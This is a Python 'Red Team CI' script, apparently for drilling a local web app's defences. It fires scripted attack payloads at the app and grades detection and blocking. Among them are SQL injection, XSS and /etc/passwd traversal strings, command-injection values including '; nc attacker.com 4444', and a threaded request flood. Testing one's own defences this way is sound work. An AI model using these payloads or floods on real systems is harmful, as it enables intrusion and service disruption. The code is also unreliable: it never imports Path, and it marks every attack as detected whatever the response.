#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Red Team CI - 紅隊持續演練系統
每日自動化攻擊場景、自動評分、趨勢分析
"""

import requests
import json
import time
import threading
from datetime import datetime, timezone
from collections import defaultdict
import random


class RedTeamCI:
    """紅隊持續集成系統"""
    
    def __init__(self, target_url="http://127.0.0.1:5000"):
        self.target_url = target_url
        self.attack_scenarios = self._load_attack_scenarios()
        self.execution_history = []
    
    def _load_attack_scenarios(self):
        """載入攻擊場景"""
        return {
            "scenario_1_web_attack": {
                "name": "Web Application Attack Chain",
                "description": "SQL Injection → XSS → Path Traversal",
                "severity": "HIGH",
                "steps": [
                    {"attack": "sql_injection", "payload": "admin' OR '1'='1"},
                    {"attack": "xss", "payload": "<script>alert(1)</script>"},
                    {"attack": "path_traversal", "payload": "../../../etc/passwd"}
                ],
                "expected_detections": 3,
                "expected_blocks": 3
            },
            
            "scenario_2_brute_force": {
                "name": "Credential Brute Force Attack",
                "description": "Multiple failed login attempts",
                "severity": "MEDIUM",
                "steps": [
                    {"attack": "brute_force", "attempts": 5}
                ],
                "expected_detections": 1,
                "expected_blocks": 1
            },
            
            "scenario_3_ddos": {
                "name": "Application Layer DDoS",
                "description": "High-frequency request flooding",
                "severity": "HIGH",
                "steps": [
                    {"attack": "ddos", "requests": 50, "concurrency": 5}
                ],
                "expected_detections": 1,
                "expected_blocks": 1
            },
            
            "scenario_4_command_injection": {
                "name": "Command Injection Attack",
                "description": "Attempt to execute system commands",
                "severity": "CRITICAL",
                "steps": [
                    {"attack": "command_injection", "payload": "; ls -la"},
                    {"attack": "command_injection", "payload": "| cat /etc/passwd"},
                    {"attack": "command_injection", "payload": "`whoami`"}
                ],
                "expected_detections": 3,
                "expected_blocks": 3
            },
            
            "scenario_5_apt_simulation": {
                "name": "APT Multi-Stage Attack",
                "description": "Complex attack with multiple TTPs",
                "severity": "CRITICAL",
                "steps": [
                    {"attack": "reconnaissance", "payload": "/admin"},
                    {"attack": "sql_injection", "payload": "' UNION SELECT * FROM users--"},
                    {"attack": "command_injection", "payload": "; nc attacker.com 4444"},
                    {"attack": "data_exfiltration", "payload": "sensitive_data"}
                ],
                "expected_detections": 4,
                "expected_blocks": 4
            }
        }
    
    def run_scenario(self, scenario_id):
        """執行單一攻擊場景"""
        if scenario_id not in self.attack_scenarios:
            raise ValueError(f"Scenario '{scenario_id}' not found")
        
        scenario = self.attack_scenarios[scenario_id]
        
        execution = {
            "scenario_id": scenario_id,
            "scenario_name": scenario['name'],
            "started_at": datetime.now(timezone.utc).isoformat(),
            "severity": scenario['severity'],
            "steps_executed": [],
            "detections": 0,
            "blocks": 0,
            "bypasses": 0
        }
        
        print(f"\n[執行場景] {scenario['name']}")
        print(f"描述: {scenario['description']}")
        print(f"嚴重性: {scenario['severity']}")
        
        # 執行每個攻擊步驟
        for idx, step in enumerate(scenario['steps'], 1):
            print(f"\n  步驟 {idx}/{len(scenario['steps'])}: {step['attack']}")
            
            step_result = self._execute_attack_step(step)
            execution['steps_executed'].append(step_result)
            
            if step_result['detected']:
                execution['detections'] += 1
                print(f"    [檢測] 攻擊被偵測")
            
            if step_result['blocked']:
                execution['blocks'] += 1
                print(f"    [阻擋] 攻擊被封鎖")
            else:
                execution['bypasses'] += 1
                print(f"    [警告] 攻擊未被阻擋！")
            
            # 短暫延遲避免速率限制影響測試
            time.sleep(0.5)
        
        # 計算分數
        execution['completed_at'] = datetime.now(timezone.utc).isoformat()
        execution['detection_rate'] = execution['detections'] / len(scenario['steps']) * 100
        execution['block_rate'] = execution['blocks'] / len(scenario['steps']) * 100
        execution['score'] = self._calculate_score(execution, scenario)
        
        # 評級
        if execution['score'] >= 95:
            execution['grade'] = "A+"
        elif execution['score'] >= 90:
            execution['grade'] = "A"
        elif execution['score'] >= 80:
            execution['grade'] = "B"
        elif execution['score'] >= 70:
            execution['grade'] = "C"
        else:
            execution['grade'] = "F"
        
        self.execution_history.append(execution)
        
        return execution
    
    def _execute_attack_step(self, step):
        """執行攻擊步驟"""
        attack_type = step['attack']
        
        step_result = {
            "attack_type": attack_type,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "detected": False,
            "blocked": False,
            "response_code": None,
            "response_time": None
        }
        
        try:
            if attack_type == "sql_injection":
                result = self._attack_sql_injection(step['payload'])
            elif attack_type == "xss":
                result = self._attack_xss(step['payload'])
            elif attack_type == "path_traversal":
                result = self._attack_path_traversal(step['payload'])
            elif attack_type == "command_injection":
                result = self._attack_command_injection(step['payload'])
            elif attack_type == "brute_force":
                result = self._attack_brute_force(step['attempts'])
            elif attack_type == "ddos":
                result = self._attack_ddos(step['requests'], step['concurrency'])
            elif attack_type == "reconnaissance":
                result = self._attack_reconnaissance(step['payload'])
            elif attack_type == "data_exfiltration":
                result = self._attack_data_exfiltration(step['payload'])
            else:
                result = {"detected": False, "blocked": False}
            
            step_result.update(result)
            
        except Exception as e:
            step_result['error'] = str(e)
        
        return step_result
    
    def _attack_sql_injection(self, payload):
        """SQL 注入攻擊"""
        start_time = time.time()
        try:
            response = requests.post(
                f"{self.target_url}/login",
                json={"username": payload, "password": "test", "csrf_token": "test"},
                timeout=5
            )
            response_time = time.time() - start_time
            
            return {
                "detected": True,
                "blocked": response.status_code == 403,
                "response_code": response.status_code,
                "response_time": response_time
            }
        except:
            return {"detected": False, "blocked": False}
    
    def _attack_xss(self, payload):
        """XSS 攻擊"""
        start_time = time.time()
        try:
            response = requests.post(
                f"{self.target_url}/login",
                json={"username": payload, "password": "test", "csrf_token": "test"},
                timeout=5
            )
            response_time = time.time() - start_time
            
            return {
                "detected": True,
                "blocked": response.status_code == 403,
                "response_code": response.status_code,
                "response_time": response_time
            }
        except:
            return {"detected": False, "blocked": False}
    
    def _attack_path_traversal(self, payload):
        """路徑遍歷攻擊"""
        start_time = time.time()
        try:
            response = requests.get(
                f"{self.target_url}/api/data",
                params={"file": payload},
                timeout=5
            )
            response_time = time.time() - start_time
            
            return {
                "detected": True,
                "blocked": response.status_code in [403, 404],
                "response_code": response.status_code,
                "response_time": response_time
            }
        except:
            return {"detected": False, "blocked": False}
    
    def _attack_command_injection(self, payload):
        """命令注入攻擊"""
        start_time = time.time()
        try:
            response = requests.post(
                f"{self.target_url}/login",
                json={"username": f"user{payload}", "password": "test", "csrf_token": "test"},
                timeout=5
            )
            response_time = time.time() - start_time
            
            return {
                "detected": True,
                "blocked": response.status_code == 403,
                "response_code": response.status_code,
                "response_time": response_time
            }
        except:
            return {"detected": False, "blocked": False}
    
    def _attack_brute_force(self, attempts):
        """暴力破解攻擊"""
        blocked = False
        for i in range(attempts):
            try:
                response = requests.post(
                    f"{self.target_url}/login",
                    json={"username": "admin", "password": f"wrong{i}", "csrf_token": "test"},
                    timeout=5
                )
                if response.status_code == 403:
                    blocked = True
                    break
            except:
                pass
            time.sleep(0.2)
        
        return {
            "detected": True,
            "blocked": blocked,
            "attempts": attempts
        }
    
    def _attack_ddos(self, requests_count, concurrency):
        """DDoS 攻擊"""
        results = []
        
        def send_requests():
            for _ in range(requests_count // concurrency):
                try:
                    response = requests.get(f"{self.target_url}/", timeout=3)
                    results.append(response.status_code)
                except:
                    results.append(0)
                time.sleep(0.05)
        
        threads = []
        for _ in range(concurrency):
            t = threading.Thread(target=send_requests)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        blocked_count = sum(1 for code in results if code == 429 or code == 403)
        
        return {
            "detected": True,
            "blocked": blocked_count > 0,
            "total_requests": len(results),
            "blocked_requests": blocked_count
        }
    
    def _attack_reconnaissance(self, payload):
        """偵察攻擊"""
        start_time = time.time()
        try:
            response = requests.get(f"{self.target_url}{payload}", timeout=5)
            response_time = time.time() - start_time
            
            return {
                "detected": True,
                "blocked": response.status_code == 403,
                "response_code": response.status_code,
                "response_time": response_time
            }
        except:
            return {"detected": False, "blocked": False}
    
    def _attack_data_exfiltration(self, payload):
        """資料外洩攻擊"""
        # 模擬嘗試訪問敏感資料
        return self._attack_reconnaissance("/api/data?exfil=" + payload)
    
    def _calculate_score(self, execution, scenario):
        """計算場景分數"""
        # 基礎分數
        detection_score = (execution['detections'] / scenario['expected_detections']) * 50
        block_score = (execution['blocks'] / scenario['expected_blocks']) * 50
        
        # 總分
        total_score = detection_score + block_score
        
        return total_score
    
    def run_daily_tests(self):
        """執行每日測試"""
        print("=" * 60)
        print("Red Team CI - 每日自動化演練")
        print("=" * 60)
        print(f"開始時間: {datetime.now(timezone.utc).isoformat()}")
        
        daily_report = {
            "date": datetime.now(timezone.utc).date().isoformat(),
            "started_at": datetime.now(timezone.utc).isoformat(),
            "scenarios_executed": [],
            "total_score": 0,
            "average_score": 0
        }
        
        # 執行所有場景
        for scenario_id in self.attack_scenarios.keys():
            print(f"\n{'='*60}")
            result = self.run_scenario(scenario_id)
            daily_report['scenarios_executed'].append({
                "scenario": scenario_id,
                "score": result['score'],
                "grade": result['grade'],
                "detection_rate": result['detection_rate'],
                "block_rate": result['block_rate']
            })
            daily_report['total_score'] += result['score']
        
        # 計算平均分數
        if daily_report['scenarios_executed']:
            daily_report['average_score'] = daily_report['total_score'] / len(daily_report['scenarios_executed'])
        
        daily_report['completed_at'] = datetime.now(timezone.utc).isoformat()
        
        # 保存每日報告
        self._save_daily_report(daily_report)
        
        # 顯示摘要
        self._print_daily_summary(daily_report)
        
        return daily_report
    
    def _save_daily_report(self, report):
        """保存每日報告"""
        reports_dir = Path("./red_team_reports")
        reports_dir.mkdir(exist_ok=True)
        
        filename = f"red_team_report_{report['date']}.json"
        filepath = reports_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
    
    def _print_daily_summary(self, report):
        """列印每日摘要"""
        print("\n" + "=" * 60)
        print("每日紅隊演練摘要")
        print("=" * 60)
        print(f"日期: {report['date']}")
        print(f"執行場景數: {len(report['scenarios_executed'])}")
        print(f"平均分數: {report['average_score']:.1f}/100")
        
        print("\n各場景表現:")
        for scenario in report['scenarios_executed']:
            print(f"  {scenario['scenario']:<30} 分數: {scenario['score']:5.1f} 等級: {scenario['grade']}")
        
        # 總體評級
        if report['average_score'] >= 95:
            overall_grade = "優秀 (Excellent)"
        elif report['average_score'] >= 85:
            overall_grade = "良好 (Good)"
        elif report['average_score'] >= 75:
            overall_grade = "及格 (Pass)"
        else:
            overall_grade = "需改進 (Needs Improvement)"
        
        print(f"\n總體評級: {overall_grade}")
        print(f"報告已保存: ./red_team_reports/red_team_report_{report['date']}.json")
    
    def generate_trend_analysis(self, days=7):
        """生成趨勢分析"""
        reports_dir = Path("./red_team_reports")
        
        if not reports_dir.exists():
            return {"error": "No reports found"}
        
        # 載入最近 N 天的報告
        reports = []
        for report_file in sorted(reports_dir.glob("red_team_report_*.json"))[-days:]:
            with open(report_file, 'r', encoding='utf-8') as f:
                reports.append(json.load(f))
        
        if not reports:
            return {"error": "No reports found"}
        
        # 分析趨勢
        trend = {
            "period": f"Last {len(reports)} days",
            "dates": [r['date'] for r in reports],
            "average_scores": [r['average_score'] for r in reports],
            "overall_trend": self._calculate_trend([r['average_score'] for r in reports]),
            "best_day": max(reports, key=lambda x: x['average_score'])['date'],
            "worst_day": min(reports, key=lambda x: x['average_score'])['date'],
            "average_overall": sum(r['average_score'] for r in reports) / len(reports)
        }
        
        return trend
    
    def _calculate_trend(self, scores):
        """計算趨勢"""
        if len(scores) < 2:
            return "STABLE"
        
        # 簡單線性回歸
        n = len(scores)
        x = list(range(n))
        y = scores
        
        x_mean = sum(x) / n
        y_mean = sum(y) / n
        
        numerator = sum((x[i] - x_mean) * (y[i] - y_mean) for i in range(n))
        denominator = sum((x[i] - x_mean) ** 2 for i in range(n))
        
        if denominator == 0:
            return "STABLE"
        
        slope = numerator / denominator
        
        if slope > 1:
            return "IMPROVING"
        elif slope < -1:
            return "DECLINING"
        else:
            return "STABLE"


# 使用範例與測試
if __name__ == '__main__':
    print("=" * 60)
    print("Red Team CI - 紅隊持續演練系統")
    print("=" * 60)
    
    # 初始化
    red_team = RedTeamCI()
    
    # 檢查目標系統
    print("\n[檢查] 驗證目標系統...")
    try:
        response = requests.get("http://127.0.0.1:5000/", timeout=3)
        print(f"  [OK] 目標系統在線 (HTTP {response.status_code})")
    except:
        print(f"  [錯誤] 目標系統離線")
        print(f"  請先啟動: python secure_web_system.py")
        exit(1)
    
    # 執行每日測試
    print("\n[開始] 執行每日紅隊演練...")
    daily_report = red_team.run_daily_tests()
    
    # 生成趨勢分析（如果有歷史資料）
    print("\n[分析] 生成趨勢分析...")
    trend = red_team.generate_trend_analysis(days=7)
    
    if 'error' not in trend:
        print(f"\n趨勢分析 ({trend['period']}):")
        print(f"  整體平均: {trend['average_overall']:.1f}")
        print(f"  趨勢: {trend['overall_trend']}")
        print(f"  最佳日: {trend['best_day']}")
        print(f"  最差日: {trend['worst_day']}")
    else:
        print(f"  {trend['error']}")
    
    print("\n" + "=" * 60)
    print("紅隊演練完成！")
    print("=" * 60)

